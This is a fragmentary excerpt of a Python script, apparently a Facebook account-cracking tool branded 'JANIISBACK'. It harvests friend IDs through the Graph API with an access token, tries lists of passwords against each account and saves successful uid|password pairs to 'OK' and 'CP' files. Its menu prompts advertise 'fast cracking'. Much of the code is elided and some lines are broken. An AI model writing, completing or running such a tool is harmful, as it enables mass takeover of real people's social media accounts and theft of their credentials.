...
print("""\x1b[0;32m╔═══════════════════════════════════════╗
              ...
              \x1b[0;33m║       WELCOME TO MY TOOLS  [🔥 JANIISBACK 🔥]                      ║
...
\x1b[0;33m║       #GITHUB : https://github.com/JaniTechnical║
...
def menu():
	...
	elif Jani == "1" or King== "01":

		publik()

		method()

	elif Jani == "2" or King == "02":

		follower()

		method()

	elif Jani == "3" or  King == "03":

		massal()

		method()

	elif Jani == "4" or King == "04":
...
def massal():
	...
	try:tanya_Total = int(input("\033[1;96m[\033[1;94m+\033[1;96m] ENTER OPTION ID'S [HOW MANY] : "))
	...
	for t in range(tanya_Total):
		...
		try:for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				open("CP/%s.txt"%(Jani),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				open("OK/%s.txt"%(Jani),"a").write(" + %s|%s\n"%(uid, pw))
...
def manual():
	...
	print("\n[+] Type , For 2nd Password For Example : <223344><786786><123456> etc")
	...
	print("[+] Enter 1st Passwords For Fast Cracking Speed\n")
